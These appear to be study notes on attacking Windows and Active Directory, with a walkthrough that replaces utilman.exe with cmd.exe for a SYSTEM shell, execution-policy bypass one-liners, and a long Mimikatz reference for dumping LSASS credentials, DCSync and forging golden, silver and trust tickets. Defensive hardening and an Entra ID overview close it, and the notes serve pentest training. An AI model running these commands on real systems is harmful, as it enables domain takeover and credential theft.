running as SYSTEM and take ownership of the service's executable
### Use TakeOwnership command Syntax >>

takeown /f C:\Windows\System32\Utilman.exe Just for test purposes We'll abuse utilman.exe to escalate privileges this time. Utilman is a built-in Windows application used to provide Ease of Access options
### during the lock screen

### Since Utilman is run with SYSTEM privileges, we will effectively gain SYSTEM

### privileges if we replace the original binary for any payload we like. As we can

take ownership of any file, replacing it is trivial. To replace utilman, we will start
### by taking ownership of it with the following command

### 2 Notice that being the owner of a ﬁle doesn't necessarily mean that you have

privileges over it, but being the owner you can assign yourself any privileges you need. To give your user full permissions over utilman.exe you can use the
### following command syntax below

### icacls C:\Windows\System32\Utilman.exe /grant Username:F

3 After this, we will replace utilman.exe with a copy of cmd.exe: Command Prompt
### C:\Windows\System32\> copy cmd.exe utilman.exe

### And ﬁnally, proceed to click on the "Ease of Access" button, which runs

### utilman.exe with SYSTEM privileges. Since we replaced it with a cmd.exe copy, we

will get a command prompt with SYSTEM privileges which you can comfirm with whoami /priv
### SeImpersonate / SeAssignPrimaryToken

### These privileges allow a process to impersonate other users and act on their

behalf. Impersonation usually consists of being able to spawn a process or thread under the security context of another user.
### As attackers, if we manage to take control of a process with SeImpersonate or

SeAssignPrimaryToken privileges, we can impersonate any user connecting and authenticating to that process.
### In Windows systems, you will ﬁnd that the LOCAL SERVICE and NETWORK

SERVICE ACCOUNTS already have such privileges
### Unpatched Software

### Software installed on the target system can present various privilege escalation

### opportunities. As with drivers, organisations and users may not update them as

### often as they update the operating system. You can use the wmic tool to list

### software installed on the target system and its versions. The command below will

dump information it can gather on installed software (it might take around a minute to finish):
### wmic product get name,version,vendor

Remember that the wmic product command may not return all installed programs.
### Depending on how some of the programs were installed, they might not get listed

### here. It is always worth checking desktop shortcuts, available services or

generally any trace that indicates the existence of additional software that might
### be vulnerable. Once we have gathered product version information, we can always

search for existing exploits on the installed software online on sites like exploit-
### db, packet storm or plain old Google, amongst many others.Using wmic and Google,

can you find a known vulnerability on any installed product?
### Automated Scripts #ToolsOfTrade

### Several scripts exist to conduct system enumeration in ways similar to the ones

### seen in the previous task. These tools can shorten the enumeration process time

### and uncover different potential privilege escalation vectors. However, please

remember that automated tools can sometimes miss privilege escalation. Below are a few tools commonly used to identify privilege escalation vectors. Feel free to run them against any of the machines in this room and see if the results match the discussed attack vectors.
WinPEAS
### WinPEAS is a script developed to enumerate the target system to uncover

### privilege escalation paths. You can ﬁnd more information about winPEAS and

### download either the precompiled executable or a .bat script. WinPEAS will run

commands similar to the ones listed in the previous task and print their output.
### The output from winPEAS can be lengthy and sometimes difﬁcult to read. This is

why it would be good practice to always redirect the output to a file, as shown below: Command Prompt C:\> winpeas.exe > outputfile.txt
### PrivescCheck

### PrivescCheck is a PowerShell script that searches common privilege escalation on

the target system. It provides an alternative to WinPEAS without requiring the execution of a binary file. PrivescCheck can be downloaded here. https://github.com/itm4n/PrivescCheck
### From a command prompt:

C:\Temp\> powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
### From a PowerShell prompt:

### PS C:\Temp\> Set-ExecutionPolicy Bypass -Scope process -Force

### PS C:\Temp\> . .\PrivescCheck.ps1; Invoke-PrivescCheck

### From a PowerShell prompt without modifying the execution policy:

PS C:\Temp\> Get-Content .\PrivescCheck.ps1 | Out-String | IEX
### PS C:\Temp\> Invoke-PrivescCheck

# Navigate to the directory containing the script (if necessary)
cd C:\Path\To\Your\Script # Dot source the script to load the function . .\Get-ADConnectPassword.ps1 # Call the function
### Get-ADConnectPassword

### These methods provide various ways to access service conﬁguration details & ﬁnd

### service binary paths that could be modiﬁed by a low privileged user depending on

your permissions and the specific requirements of your environment.
### ### 1. Using `sc.exe` Utility

### sc.exe queryex type= service state= all | ForEach-Object { if ($_ -match

"SERVICE_NAME:") { sc.exe qc ($_.Trim().Split(":")[1].Trim()) | Select-String
## "Binary_Path_Name" }}

### **Explanation:** Utilizes the external command `sc.exe` to query extended

information about services, including their binary path. This method parses output from `sc.exe` to extract necessary details.
### ### 2. Using `Get-WmiObject`

Get-WmiObject -Query "Select * from Win32_Service" | Select Name,
### StartMode, PathName

### **Explanation:** This command retrieves details about services using WMI

### (Windows Management Instrumentation), including the path of the executable

### associated with each service. This command uses the Get-WmiObject cmdlet to

### retrieve information about services. The cmdlet accesses Windows Management

### Instrumentation (WMI) to get details about service objects. While powerful, WMI

### queries require certain permissions on the system to execute successfully,

### especially when accessing detailed service conﬁgurations like PathName. If your

user account doesn't have the necessary permissions, it could result in a "Permission Denied" error.
### ### 3. Using `Get-Service` and `Select-Object`

### Get-Service | ForEach-Object { Get-WmiObject -Query "Select PathName from

### Win32_Service Where Name = '$($_.Name)'" } | Select PathName

### **Explanation:** This combines `Get-Service` with `Get-WmiObject` to fetch the

executable path for each service. It iterates over each service, querying WMI for
### its execution path. WMI queries require certain permissions on the system to

### execute successfully, especially when accessing detailed service conﬁgurations

### like PathName. If your user account doesn't have the necessary permissions, it

could result in a "Permission Denied" error.
### ### 4a. Querying the Registry Directly

### (gci HKLM:\SYSTEM\ControlSet001\Services | Get-ItemProperty | where

{$_.ObjectName -match 'LocalSystem'}).PSChildName
### This command uses a different approach:

gci (Get-ChildItem) -> This cmdlet is used to list items in the specified registry
### path (HKLM:\SYSTEM\ControlSet001\Services). Accessing registry keys generally

requires fewer permissions than querying service details through WMI, depending on the system's security settings. Get-ItemProperty - Retrieves properties of each service listed in the registry.
This typically includes basic configuration data stored directly in the registry.
### where {$_.ObjectName -match 'LocalSystem'} - Filters services running under the

LocalSystem account. The ObjectName property corresponds to the service's logon account. .PSChildName - Extracts the names of the services that meet the filter criteria.
### ### 4b. Querying the Registry Directly

Get-ItemProperty -Path HKLM:\System\CurrentControlSet\Services\* | Select
### PSChildName, ImagePath

**Explanation:** Directly queries the registry to get the image paths of services.
### Accessing registry keys generally requires fewer permissions than querying

### service details through WMI, depending on the system's security settings. This

method can bypass some restrictions that WMI queries face.
### Windows Exploit Suggester - Next Generation (WES-NG)

### WES-NG is a tool based on the output of Windows' systeminfo utility which

provides the list of vulnerabilities the OS is vulnerable to, including any exploits
### for these vulnerabilities. Every Windows OS between Windows XP and Windows

11, including their Windows Server counterparts, is supported. Some exploit suggesting scripts (e.g. winPEAS) will require you to upload them to
### the target system and run them there. This may cause antivirus software to

### detect and delete them. To avoid making unnecessary noise that can attract

### attention, you may prefer to use WES-NG, which will run on your attacking

machine (e.g. Kali or TryHackMe AttackBox). WES-NG is a Python script that can be found and downloaded here https://github.com/bitsadmin/wesng
### Metasploit

### If you already have a Meterpreter shell on the target system, you can use the

### multi/recon/local_exploit_suggester module to list vulnerabilities that may

affect the target system and allow you to elevate your privileges on the target system. CommandType Name: Cmd->Powershell Alias % -> ForEach-Object Alias ? -> Where-Object Alias ac -> Add-Content Alias asnp -> Add-PSSnapin Alias cat -> Get-Content
### Alias           cd -> Set-Location

Alias CFS -> ConvertFrom-String
Alias chdir -> Set-Location Alias clc -> Clear-Content Alias clear -> Clear-Host Alias clhy -> Clear-History
### Alias           cli -> Clear-Item

Alias clp -> Clear-ItemProperty Alias cls -> Clear-Host
### Alias           clv -> Clear-Variable

### Alias           cnsn -> Connect-PSSession

Alias compare -> Compare-Object Alias copy -> Copy-Item Alias cp -> Copy-Item Alias cpi -> Copy-Item
### Alias           cpp -> Copy-ItemProperty

Alias curl -> Invoke-WebRequest
### Alias           cvpa -> Convert-Path

Alias dbp -> Disable-PSBreakpoint Alias del -> Remove-Item Alias diff -> Compare-Object
### Alias           dir -> Get-ChildItem

### Alias           dnsn -> Disconnect-PSSession

Alias ebp -> Enable-PSBreakpoint Alias echo -> Write-Output Alias epal -> Export-Alias Alias epcsv -> Export-Csv Alias epsn -> Export-PSSession Alias erase -> Remove-Item Alias etsn -> Enter-PSSession Alias exsn -> Exit-PSSession Alias fc -> Format-Custom Alias fhx -> Format-Hex
### Alias           ﬂ -> Format-List

Alias foreach -> ForEach-Object Alias ft -> Format-Table Alias fw -> Format-Wide Alias gal -> Get-Alias Alias gbp -> Get-PSBreakpoint Alias gc -> Get-Content Alias gcb -> Get-Clipboard Alias gci -> Get-ChildItem Alias gcm -> Get-Command Alias gcs -> Get-PSCallStack
Alias gdr -> Get-PSDrive Alias ghy -> Get-History Alias gi -> Get-Item Alias gin -> Get-ComputerInfo Alias gjb -> Get-Job Alias gl -> Get-Location Alias gm -> Get-Member Alias gmo -> Get-Module Alias gp -> Get-ItemProperty
### Alias           gps -> Get-Process

Alias gpv -> Get-ItemPropertyValue Alias group -> Group-Object Alias gsn -> Get-PSSession Alias gsnp -> Get-PSSnapin Alias gsv -> Get-Service Alias gtz -> Get-TimeZone Alias gu -> Get-Unique Alias gv -> Get-Variable Alias gwmi -> Get-WmiObject Alias h -> Get-History Alias history -> Get-History Alias icm -> Invoke-Command Alias iex -> Invoke-Expression Alias ihy -> Invoke-History Alias ii -> Invoke-Item Alias ipal -> Import-Alias Alias ipcsv -> Import-Csv Alias ipmo -> Import-Module Alias ipsn -> Import-PSSession
### Alias           irm -> Invoke-RestMethod

Alias ise -> powershell_ise.exe Alias iwmi -> Invoke-WmiMethod Alias iwr -> Invoke-WebRequest Alias kill -> Stop-Process Alias lp -> Out-Printer Alias ls -> Get-ChildItem Alias man -> help
### Alias           md -> mkdir

Alias measure -> Measure-Object Alias mi -> Move-Item Alias mount -> New-PSDrive Alias move -> Move-Item
Alias mp -> Move-ItemProperty Alias mv -> Move-Item Alias nal -> New-Alias Alias ndr -> New-PSDrive Alias ni -> New-Item
### Alias           nmo -> New-Module

Alias npssc -> New-PSSessionConfigurationFile Alias nsn -> New-PSSession Alias nv -> New-Variable Alias ogv -> Out-GridView Alias oh -> Out-Host Alias popd -> Pop-Location Alias ps -> Get-Process Alias pushd -> Push-Location Alias pwd -> Get-Location
### Alias           r -> Invoke-History

Alias rbp -> Remove-PSBreakpoint
### Alias           rcjb -> Receive-Job

Alias rcsn -> Receive-PSSession Alias rd -> Remove-Item Alias rdr -> Remove-PSDrive Alias ren -> Rename-Item Alias ri -> Remove-Item Alias rjb -> Remove-Job Alias rm -> Remove-Item Alias rmdir -> Remove-Item Alias rmo -> Remove-Module
### Alias           rni -> Rename-Item

### Alias           rnp -> Rename-ItemProperty

Alias rp -> Remove-ItemProperty Alias rsn -> Remove-PSSession Alias rsnp -> Remove-PSSnapin Alias rujb -> Resume-Job Alias rv -> Remove-Variable Alias rvpa -> Resolve-Path Alias rwmi -> Remove-WmiObject Alias sajb -> Start-Job Alias sal -> Set-Alias Alias saps -> Start-Process Alias sasv -> Start-Service Alias sbp -> Set-PSBreakpoint Alias sc -> Set-Content
Alias scb -> Set-Clipboard Alias select -> Select-Object Alias set -> Set-Variable Alias shcm -> Show-Command Alias si -> Set-Item Alias sl -> Set-Location Alias sleep -> Start-Sleep Alias sls -> Select-String Alias sort -> Sort-Object Alias sp -> Set-ItemProperty Alias spjb -> Stop-Job Alias spps -> Stop-Process Alias spsv -> Stop-Service Alias start -> Start-Process Alias stz -> Set-TimeZone Alias sujb -> Suspend-Job Alias sv -> Set-Variable Alias swmi -> Set-WmiInstance Alias tee -> Tee-Object Alias trcm -> Trace-Command
### Alias           type -> Get-Content

Alias wget -> Invoke-WebRequest Alias where -> Where-Object Alias wjb -> Wait-Job
### Alias           write -> Write-Output

### Mimikatz is a Windows x32/x64 program coded in C by Benjamin Delpy

### (@gentilkiwi) in 2007 to learn more about Windows credentials (and as a Proof of

### Concept). There are two optional components that provide additional features,

### mimidrv (driver to interact with the Windows kernal) and mimilib (AppLocker

### bypass, Auth package/SSP, password ﬁlter, and sekurlsa for WinDBG). Mimikatz

### requires administrator or SYSTEM and often debug rights in order to perform

### certain actions and interact with the LSASS process (depending on the action

requested). The Mimikatz.exe contains, or at least should contain, all capability noted there.
### Mimikatz capability can be leveraged by compiling and running your own version,

### running the Mimikatz executable, leveraging the MetaSploit script[Fortunately,

### Metasploit has decided to include Mimikatz as a meterpreter script to allow for

easy access to its full set of features without needing to upload any files to the disk of the compromised host], the official Invoke-Mimikatz PowerShell version, or
### one of the dozen of Mimikatz PowerShell variants (I happen to be partial to

PowerShell Empire, because Empire is awesome!).
### Enabling LSA protection:

### Open the Registry Editor (RegEdit.exe), and navigate to the registry key that

is located at: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa and Set the value of the registry key to: “RunAsPPL”=dword:00000001.
### Create a new GPO and browse to Computer Conﬁguration, Preferences,

### Windows Settings. Right-click Registry, point to New, and then click Registry

### Item. The New Registry Properties dialog box appears. In the Hive list, click

### HKEY_LOCAL_MACHINE. In the Key Path list, browse to

SYSTEM\CurrentControlSet\Control\Lsa. In the Value name box, type RunAsPPL. In the Value type box, click the REG_DWORD. In the Value data box, type 00000001.Click OK. LSA Protection prevents non-protected processes from interacting with LSASS. Mimikatz can still bypass this with a driver (“!+”).
### Most Popular Mimikatz Commands:

Here are just some of the most popular Mimikatz command and related functionality.
### The DPAPI Mimikatz module provides capability to extract Windows stored (and

### protected) credential data using DPAPI.  DPAPI is the ofﬁcial Windows method to

protect (encrypt) local data (usually passwords).
### The CRYPTO Mimikatz module provides advanced capability to interface with

### Windows cryptographic functions (CryptoAPI)

### The KERBEROS Mimikatz module is used to interface with the ofﬁcial Microsoft

Kerberos API. No special rights are required for the commands in this module.
### The LSADUMP Mimikatz Module interacts with the Windows Local Security

### Authority (LSA) to extract credentials. Most of these commands require either

### debug rights (privlege::debug) or local System. By default, the Administrators

group has Debug rights. Debug still has to be “activated” by running “privilege::debug”.
### The Mimikatz PROCESS module provides the ability to gather data on processes

and interact with processes. i.e List Running Processes, Export and Import Processes
### The SEKURLSA Mimikatz module interacts with protected memory. This module

### extracts passwords, keys, pin codes, tickets from the memory of lsass (Local

### Security Authority Subsystem Service). In order to interact with LSASS, the

### Mimikatz process requires appropriate rights:

Administrator, to get debug privilege via “PRIVILEGE::Debug” SYSTEM rights (“TOKEN::elevate”)
However, running against a dumped LSASS process file (i.e. LSASS.dmp), elevated rights are not required.
### The Mimikatz Token module enables Mimikatz to interact with Windows

### authentication tokens, including grabbing and impersonating existing tokens

### CRYPTO::Certiﬁcates – list/export certiﬁcates

### KERBEROS::Golden – create golden/silver/trust tickets

The capability of this command is based on the password hash type retrieved. Type Requirement Scope Golden KRBTGT hash Domain/Forest Silver Service hash Service Trust Trust hash Domain/Forest -> Domain/Forest Golden && Silver Ticket Default Groups:
### Domain Users SID: S-1-5-21<DOMAINID>-513

### Domain Admins SID: S-1-5-21<DOMAINID>-512

### Schema Admins SID: S-1-5-21<DOMAINID>-518

### Enterprise Admins SID: S-1-5-21<DOMAINID>-519  (this is only effective when

the forged ticket is created in the Forest root domain, though add using /sids
### parameter for AD forest admin rights)

### Group Policy Creator Owners SID: S-1-5-21<DOMAINID>-520

### The account with RID 502 is the KRBTGT account and the account with RID 500

is the default administrator for the domain.
### Golden Ticket

A Golden Ticket is a TGT using the KRBTGT NTLM password hash to encrypt and
### sign. /krbtgt:parameter

A Golden Ticket (GT) can be created to impersonate any user (real or imagined) in
### the domain as a member of any group in the domain (providing a virtually

### unlimited amount of rights) to any and every resource in the domain. Since the

Golden Ticket is an authentication ticket (TGT described below), its scope is the entire domain (and the AD forest by leveraging SID History) since the TGT is used
### to get service tickets (TGS) used to access resources. The Golden Ticket (TGT)

### contains user group membership information (PAC) and is signed and encrypted

### using the domain’s Kerberos service account (KRBTGT) which can only be opened

### and read by the KRBTGT account. To summarize, once an attacker gets access to

the KRBTGT password hash, they can create Golden Tickets (TGT) that provide access to anything in AD at any time.
### Silver Ticket

A Silver Ticket is a TGS (similar to TGT in format) using the target service
account’s NTLM password hash to encrypt and sign —> /rc4:Parameter.
### The Mimikatz command to create a silver ticket is “kerberos::golden”

### Example Mimikatz Command to Create a Silver Ticket:

### The following Mimikatz command creates a Silver Ticket for the CIFS service on

the server adsmswin2k8r2.lab.adsecurity.org. In order for this Silver Ticket to be
### successfully created, the AD computer account password hash for

### adsmswin2k8r2.lab.adsecurity.org needs to be discovered, either from an AD

### domain dump or by running Mimikatz on the local system as shown above

### (Mimikatz “privilege::debug” “sekurlsa::logonpasswords” exit). The NTLM password

### hash is used with the /rc4 paramteer. The service SPN - Comprehensive

Reference type also needs to be identified in the /service parameter . Finally, the target computer’s fully-qualified domain name needs to be provided in the /target parameter. Don’t forget the domain SID in the /sid parameter.
### Syntax: “kerberos::golden /admin:LukeSkywalker /id:1106 /

### domain:lab.adsecurity.org /sid:S-1-5-21-1473643419-774954089-2222329127 /

### target:adsmswin2k8r2.lab.adsecurity.org /

rc4:d7e2b80507ea074ad59f152a1ba20458 /service:cifs /ptt” exit
### Trust Ticket

### Once the Active Directory Trust password hash is determined (Mimikatz

“privilege::debug” “lsadump::trust /patch” exit), a trust ticket can be generated.
### Forging Internal AD Forest Trust Tickets

### Step 1: Dumping trust passwords (trust keys)

Current Mimikatz versions can extract the trust keys (passwords).
### *  Mimikatz “privilege::debug” “lsadump::trust /patch” exit

### Step 2: Create a forged trust ticket (inter-realm TGT) using Mimikatz

### Forge the trust ticket which states the ticket holder is an Enterprise Admin in

the AD Forest. This enables full administrative access from a child domain to the
### parent domain. Note that this account doesn’t have to exist anywhere as it is

effectively a Golden Ticket across the trust.
### Syntax: “Kerberos::golden /domain:child.lab.adsecurity.org /

### sid:S-1-5-21-3677078698-724690114-1972670770 /

### sids:S-1-5-21-1581655573-3923512380-696647894-519 /

### rc4:49ed1653275f78846ff06de1a02386fd /user:DarthVader /service:krbtgt /

### target:lab.adsecurity.org /ticket:c:\temp\tickets\EA-ADSECLABCHILD.kirbi”

### Note: Using the /sids parameter will create a trust ticket for the target AD

domain that says the holder of the Ticket is an Enterprise Admin specified by 519 in SIDs
### Step 3: Use the Trust Ticket ﬁle created in Step 2 to get a TGS for the targeted

service in the destination domain. Save the TGS to a file.
### The resulting TGS provides EA access to the parent (root) domain’s Domain

Controller by targeting the CIFS service in this example (but it could target any).
Step 4: Inject the TGS file created in Step 3 and then access the targeted service with the spoofed rights.
### Mimikatz Golden && Silver Ticket && Trust Command Required Parameters:

/krbtgt – NTLM password hash for the domain KDC service account (KRBTGT). Used to encrypt and sign the TGT.
### /rc4 – the NTLM hash for the service (computer account or user account)

/domain – the fully qualified domain name. In this example: “lab.adsecurity.org”. /sid – the SID of the domain. In this example:
## “S-1-5-21-1473643419-774954089-2222329127”.

### /sids – Additional SIDs for accounts/groups in the AD forest with rights you

want the ticket to spoof. Typically, this will be the Enterprise Admins group for
### the root domain  “S-1-5-21-1473643419-774954089-5872329127-519”. This

parameter adds the provided SIDs to the SID History parameter.
### /user – username to impersonate

### /groups (optional) – group RIDs the user is a member of (the ﬁrst is the

primary group) default: 513,512,520,518,519 for the well-known Administrator’s groups (listed below).
### /ticket (optional) – provide a path and name for saving the forged ticket ﬁle

to for later use or use /ptt to immediately inject the golden ticket into memory for use. /ptt – as an alternate to /ticket – use this to immediately inject the forged ticket into memory for use. /id (optional) – user RID. Mimikatz default is 500 (the default Administrator account RID). /startoffset (optional) – the start offset when the ticket is available (generally set to –10 or 0 if this option is used). Mimikatz Default value is 0.
### /endin (optional) – ticket lifetime. Mimikatz Default value is 10 years

(~5,262,480 minutes). Active Directory default Kerberos policy setting is 10 hours (600 minutes).
### /renewmax (optional) – maximum ticket lifetime with renewal. Mimikatz

Default value is 10 years (~5,262,480 minutes). Active Directory default Kerberos policy setting is 7 days (10,080 minutes). /aes128 – the AES128 key /aes256 – the AES256 key
### Silver Ticket Required Parameters:

### /target – target server’s (in FQDN) where the service is running

### /service – the kerberos service running on the target server. This parameter

### is Service Principal Name SPN->Active Directory Service Principal Names (SPNs)

Descriptions class (or type) such as cifs, http, mssql. /rc4 – the NTLM hash for the service (computer account or user account)
Trust Ticket Specific Required Parameters: /target – the target domain’s FQDN. /service – the kerberos service running in the target domain (krbtgt). /rc4 – the NTLM hash for the service kerberos service account (krbtgt hash). /ticket – provide a path and name for saving the forged ticket file to for later
### use or use

/ptt to immediately inject the golden ticket into memory for use.
### KERBEROS::List – List all user tickets (TGT and TGS) in user memory in

Heimdall cache. No special privileges required since it only displays the current user’s tickets. Similar to functionality of “klist”. Can be specified with a flag /
### export:ﬁle -> to export user ticket to ﬁles parameter

### KERBEROS::PTT – pass the ticket. Typically used to inject a stolen or forged

Kerberos ticket (golden/silver/trust) After a Kerberos ticket is found, it can be
### copied to another system and passed into the current session effectively

### simulating a logon without any communication with the Domain Controller. No

special rights required. Similar to SEKURLSA::PTH (Pass-The-Hash).
### /ﬁlename – the ticket’s ﬁlename (can be multiple)

/diretory – a directory path, all .kirbi files inside will be injected.
### KERBEROS::Purge – purge all Kerberos tickets

Similar to functionality of “klist purge”. Run this command before passing tickets (PTC, PTT, etc) to ensure the correct user context is used. KERBEROS::TGT – get current TGT for current user.
### LSADUMP::DCSync – ask a DC to synchronize an object by Impersonating a

### Domain Controller and requests account password data from targeted DC. No need

### to run code on DC. Requires Membership in Domain Administrator(s), Entreprise

### Admins, Custom delegation, as well as Domain Controller computer accounts are

### able to run DCSync to pull password data. Note that Read-Only Domain

Controllers(RODC) are not only allowed to pull password data for users by default.
### The exploit method prior to DCSync was to run Mimikatz or Invoke-Mimikatz on a

### Domain Controller(Target Machine) to get the KRBTGT password hash to create

### Golden Tickets. With Mimikatz’s DCSync and the appropriate rights, the attacker

### can pull the password hash, as well as previous password hashes, from a Domain

### Controller “over the network” without requiring interactive logon or copying off

the Active Directory database file (ntds.dit), more stealthy, leaves no trace on Disk or Memory.
### How DCSync works:

Discovers Domain Controller in the specified domain name.
### Requests the Domain Controller replicate the user credentials via

GetNCChanges (leveraging Directory Replication Service (DRS) Remote Protocol) DCSync Options:
/all – DCSync pull data for the entire domain. /user – user id or SID of the user you want to pull the data for.
### /domain (optional) – FQDN of the Active Directory domain. Mimikatz will

discover a DC in the domain to connect to. If this parameter is not provided, Mimikatz defaults to the current domain.
### /csv – export to csv

/dc (optional) – Specify the Domain Controller you want DCSync to connect to and gather data.
### LSADUMP::LSA – Ask LSA Server to retrieve SAM/AD enterprise (normal,

### patch on the ﬂy or inject). Use to dump all Active Directory domain credentials

### from a Domain Controller or lsass.dmp dump ﬁle. Also used to get speciﬁc account

credential such as krbtgt with the parameter /name: “/name:krbtgt” Requires System or Debug rights.
### /inject – Inject LSASS to extract credentials

/name – account name for target user account /id – RID for target user account /patch – patch LSASS.
### LSADUMP::SAM – get the SysKey to decrypt SAM entries (from registry or

### hive). The SAM option connects to the local Security Account Manager (SAM)

database and dumps credentials for local accounts. This is used to dump all local credentials on a Windows computer.
### LSADUMP::Trust – Ask LSA Server to retrieve Trust Auth Information (normal

or patch on the fly). Dumps trust keys (passwords) for all associated trusts (domain/forest).
### MISC::AddSid – Add to SIDHistory to user account. The ﬁrst value is the

target account and the second value is the account/group name(s) (or SID). Moved to SID:modify as of May 6th, 2016. MISC::MemSSP – Inject a malicious Windows SSP to log locally authenticated credentials. MISC::Skeleton – Inject Skeleton Key into LSASS process on Domain Controller.
### This enables all user authentication to the Skeleton Key patched DC to use a

“master password” (aka Skeleton Keys) as well as their usual password. PRIVILEGE::Backup – get backup privilege/rights. Requires Debug rights. PRIVILEGE::Debug – get debug rights (this or Local System rights is required for many Mimikatz commands).
### By default, the Administrators group has Debug rights. Debug still has to be

“activated” by running “privilege::debug”.
### The debug privilege allows someone to debug a process that they wouldn’t

otherwise have access to. For example, a process running as a user with the
debug privilege enabled on its token can debug a service running as local system.
### ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061 means that

the required privilege is not held by the client (mostly you’re not an
### administrator :smirk:)

### SEKURLSA::Ekeys – list Kerberos encryption keys

### SEKURLSA::Credman - List Credential Manager

### SEKURLSA::Kerberos – List Kerberos credentials for all authenticated users

### (including services and computer account)

SEKURLSA::Krbtgt – get Domain Kerberos service account (KRBTGT)password
### data{krbtgt hash}

### SEKURLSA::LogonPasswords – lists all available provider credentials. This

usually shows recently logged on user and computer credentials.
### Dumps password data in LSASS for currently logged on (or recently logged on)

accounts as well as services running under the context of user credentials.
### Account passwords are stored in memory in a reversible manner. If they are in

### memory (prior to Windows 8.1/Windows Server 2012 R2 they were), they are

### displayed. Windows 8.1/Windows Server 2012 R2 doesn’t store the account

### password in this manner in most cases. KB2871997 “back-ports” this security

### capability to  Windows 7, Windows 8, Windows Server 2008R2, and Windows

### Server 2012, though the computer needs additional conﬁguration after applying

### KB2871997. Services running with account credentials are also dumped using this

command. Note that only services that are running (credentials in memory) can be dumped in this manner.
### Requires administrator access (with debug rights) or Local SYSTEM rights

SEKURLSA::Pth –> Pass-the-Hash(PTH) and Over-Pass-the-Hash-oPTH(Pass- the-Key)
### Mimikatz can perform the well-known operation ‘Pass-The-Hash’ to run a process

### under another credentials with NTLM hash of the user’s password, instead of its

real password. For this, it starts a process with a fake identity, then replaces fake information (NTLM hash of the fake password) with real information (NTLM hash of the real password).
### /user – the username you want to impersonate, keep in mind that

Administrator is not the only name for this well-known account.
### /domain – the fully qualiﬁed domain name – without domain or in case of local

user/admin, use computer or server name, workgroup or whatever. /rc4 or /ntlm – optional – the RC4 key / NTLM hash of the user’s password. /run – optional – the command line to run – default is: cmd to have a shell.
### SEKURLSA::Tickets – Lists all available Kerberos tickets for all recently

authenticated users, including services running under the context of a user
account and the local computer’s AD computer account.
### Unlike kerberos::list, sekurlsa uses memory reading and is not subject to key

export restrictions. sekurlsa can access tickets of others sessions (users). /export – optional – tickets are exported in .kirbi files. They start with user’s LUID
### Similar to credential dumping from LSASS, using the sekurlsa module, an attacker

can get all Kerberos ticket data in memory on a system, including those belonging to an admin or service.
### This is extremely useful if an attacker has compromised a web server conﬁgured

### for Kerberos delegation that users access with a backend SQL server. This

enables an attacker to capture and reuse all user tickets in memory on that server.
### The “kerberos::tickets” mimikatz command dumps the current logged-on user’s

### Kerberos tickets and does not require elevated rights. Leveraging the sekurlsa

module’s capability to read from protected memory (LSASS), all Kerberos tickets on the system can be dumped.
### Command:  mimikatz sekurlsa::tickets exit

Dumps all authenticated Kerberos tickets on a system.
### Requires administrator access (with debug) or Local SYSTEM rights

### SEKURLSA::Minidump – switch to LSASS minidump process context

### There are several different ways to dump LSASS:  procdump, PowerShell, Task

### Manager, etc. Note that Minidumps need to be read using the same platform it

was dumped from NT5 Win32 or NT5x64 or NT6 Win32 or NT6 x64.
### TOKEN::List – list all tokens of the system

### TOKEN::Elevate – impersonate a token. Used to elevate permissions to SYSTEM

### (default) or ﬁnd a domain admin token on the box using the Windows API

### TOKEN::Elevate /domainadmin – impersonate a token with Domain Admin

### credentials. TOKEN::Revert – revert to process token

### Microsoft Entra ID is a directory service that enables you to sign in and access

both Microsoft cloud applications and cloud applications that you develop. Microsoft Entra ID can also help you maintain your on-premises Active Directory deployment.
### Active Directory provides the core service of identity management. AD DS is the

### traditional on-premises solution, whereas Microsoft Entra ID is the cloud-based

### solution. Microsoft Entra ID is frequently adopted at ﬁrst to facilitate

authentication for cloud-based apps, but is capable of providing authentication services for the entire infrastructure.
### Although Microsoft Entra ID has many similarities to AD DS, there are also many

differences. It’s important to realize that using Microsoft Entra isn’t the same as
deploying an Active Directory domain controller on an Azure virtual machine and adding it to your on-premises domain.
### When comparing Microsoft Entra ID with AD DS, it’s important to note the

### following characteristics of Microsoft Entra ID:

### Microsoft Entra ID is primarily an identity solution, and it’s designed for

internet-based applications by using HTTP (port 80) and HTTPS (port 443) communications. Microsoft Entra ID is a multi-tenant directory service. Microsoft Entra users and groups are created in a flat structure, and there are no OUs or GPOs. You can't query Microsoft Entra ID by using LDAP; instead, Microsoft Entra ID uses the REST API over HTTP and HTTPS.
### Microsoft Entra ID doesn't use Kerberos authentication; instead, it uses HTTP

### and HTTPS protocols such as SAML, WS-Federation, and OpenID Connect for

authentication, and uses OAuth for authorization.
### Microsoft Entra ID includes federation services, and many third-party services

such as Facebook are federated with and trust Microsoft Entra ID.
### Directory Services: Microsoft Entra vs Active Directory

### Microsoft Entra: Previously known as Azure Active Directory (Azure AD),

### Microsoft Entra is indeed a comprehensive identity and access management cloud

### solution. It does not create separate tenants for each cloud service; rather, it

allows multiple services like Microsoft 365, Dynamics 365, and Azure to utilize a single tenant for centralized authentication and authorization. Active Directory (AD): This is traditionally used on-premises to handle directory services, providing authentication and authorization for users and computers within a network.
### Cloud Services Compared to On-Premises Services

### Cloud services such as Microsoft 365 serve similar functionalities as their on-

### premises counterparts (like Exchange servers for emails) but are hosted on

Microsoft's cloud infrastructure. This offers scalability, remote access, and reduced maintenance overhead compared to on-premises setups.
### Microsoft 365 as an alternate to an on-premise email server: Yes, Microsoft 365

### (including services like Exchange Online) provides a cloud-based alternative to

traditional on-premises servers, integrating closely with cloud-based directory services.
### Corrected Overview Based on the Quoted Statement

### When deploying cloud services like Microsoft 365 or Intune, a uniﬁed directory

service in the cloud, such as Microsoft Entra, is essential for managing
authentication and authorization systematically.
### Microsoft Entra ID (part of Microsoft Entra) simpliﬁes this by serving as a

singular point for identity services across multiple Microsoft cloud applications,
### which can also integrate with other identity providers or sync with an on-

premises Active Directory (using tools like AD Connect). Microsoft Entra Domain Services provides several benefits for organizations, such as: Administrators don't need to manage, update, and monitor domain controllers. Administrators don't need to deploy and manage Active Directory replication. There’s no need to have Domain Admins or Enterprise Admins groups for domains that Microsoft Entra ID manages.
### If you choose to implement Microsoft Entra Domain Services, you need to be

### aware of the service's current limitations. These include:

Only the base computer Active Directory object is supported. It’s not possible to extend the schema for the Microsoft Entra Domain Services domain. The organizational unit (OU) structure is flat and nested OUs aren't currently supported. There’s a built-in Group Policy Object (GPO), and it exists for computer and user accounts.
### It’s not possible to target OUs with built-in GPOs. Additionally, you can't use

Windows Management Instrumentation filters or security-group filtering.
